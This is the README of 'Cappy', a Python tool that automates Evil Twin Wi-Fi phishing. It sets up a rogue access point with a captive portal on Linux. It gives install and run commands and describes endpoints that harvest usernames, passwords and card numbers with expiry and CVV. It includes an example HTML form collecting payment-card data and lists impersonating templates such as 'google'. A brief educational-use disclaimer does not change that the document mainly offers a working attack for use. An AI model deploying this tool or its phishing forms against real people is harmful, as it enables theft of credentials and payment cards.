<div align="center">
  <img src="https://flockahh.b-cdn.net/B5860EAD-2DC4-4373-A00C-B0C219CB6D9A.png" alt="Cappy Logo" />
  
##   $${\color{orange}Cappy}$$ 
  
</div>
  
<div>
  
**Evil Twin** is a phishing technique categorized under network attacks, it involves the creation of a **rogue wireless access point (AP)** that masquerades as a legitimate network, such as a public Wi-Fi hotspot or a familiar network with a captive portal, to deceive users into connecting and unknowingly divulging their sensitive login credentials and other personal information transmitted over the compromised connection. 
</div>

<br />

> [!TIP]
> <strong>Cappy, a framework that automates the attack, must be used only in clear, educational purposes.<br /> Any action outside of that context is highly unrecommended, and may result in legal consequences</strong>

# Introduction

**Python** tool, that automates the process of setting up captive portal on Linux machines, with some tweaks.

> [!NOTE]
> This software was tested on: <strong>Kali Linux, KaliPi, ParrotOS</strong><br />
> In case of any trouble, create an issue and describe the error

<br />

**Cappy** operation scheme:

```
  Check Dependencies ---> Choose network interface
          |                ^         |                                                                         
          | missing?       |         └ Change mac address                      Run captive portal <--- Select Template
          |                |                   |                                       |                       |
  Install Dependencies -   |                   └ Menu Screen                           └ Capture credentials   |
                       |_ _|                          | start?                                                 |
                                                      └ Prepare adapter ---> Configure IP Adresses ---> Restart services
                                                      └ Write configs
```

# Setup

**In most cases, Cappy can handle the setup by itself, so give it a try**

<br />

**1-A.** Installing Cappy with pip

  <sub>This will make 'Cappy' available from any path in the terminal</sub>
  
  ```
    $ git clone https://github.com/FLOCK4H/Cappy
    $ cd Cappy
    $ sudo pip install .
  ```

**1-B.** Running Cappy with Python
   
   <sub>We will need to install dependencies manually</sub>

```
  $ sudo apt-get update
  $ sudo apt-get install lighttpd hostapd dnsmasq
  $ cd Cappy
  $ sudo python Cappy
```

# Usage

![image](https://github.com/FLOCK4H/Cappy/assets/161654571/ce6ee823-5408-4b14-8f3c-ce33bb53737b)

```
  $ sudo Cappy
```

**Templates** are being saved to the <i> **/usr/local/share/Cappy/templates** </i>folder.

Creating a new template will result in making new directory in that path with a name of the template.

By default, there are 2 endpoints and 5 fields, that we can use in `index.html` of the template:
- /action.html -> username, password, credit, expire, cvv
- /data -> any

Example:
```
<form method='POST' action="http://10.0.0.15:80/action.html">
    <input type='text' name='credit' placeholder="CARD NUMBER"/>
    <input type='password' name='expire' placeholder="EXPIRY DATE"/>
    <input type='password' name='cvv' placeholder="CVV"/>
    <input value='Submit' type='submit'/>
</form>
```

**Device wanting to join the network will be redirected to the `index.html` of the template, where after entering credentials and submitting, will be redirected to the `action.html`, that harvests those credentials and logs to the console.**

**There are 4 default templates**:
- `google`
- `mrhacker`
- `Valentines`
- `mcd`

Help make this number bigger, and message me with your template:

`flock4h@gmail.com \ Topic: Cappy Templates [NEW_TEMPLATE_NAME]`

<div align="center">
  <img src="https://flockahh.b-cdn.net/IMG_2835.png" alt="Result" width="400"/>
</div>

## Troubleshooting

There are numerous reasons for why the Cappy may not work, as it all depends on the network adapter, operating system, and machine capabilities itself.
Carefully read the console when launching the framework, the errors can provide more information on what's going on.

Here are the general steps on how to debug your issue:

1. Ensure dependencies are installed manually

```
  $ sudo apt-get install hostapd dnsmasq lighttpd
```

2. Check paths for conflicts:

```
  $ ls /etc/hostapd
  $ find /etc/dnsmasq.conf
  $ find /usr/local/share/Cappy
```

3. Check logs of the services:

```
  $ sudo systemctl status hostapd
  $ sudo systemctl status dnsmasq

  # If dnsmasq status replied with - 10.0.0.1-150 range is busy, you need to change all 10.0.0.15 and 10.0.0.20-150 entries in the code to other IP and range.
```

> [!TIP]
> In case when troubleshooting steps did not work; please create an issue

## TODO

- [ ] Add run arguments
- [ ] Stable release
- [ ] PyPi release

## LICENSE

$${\color{orange}MIT}$$ 
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
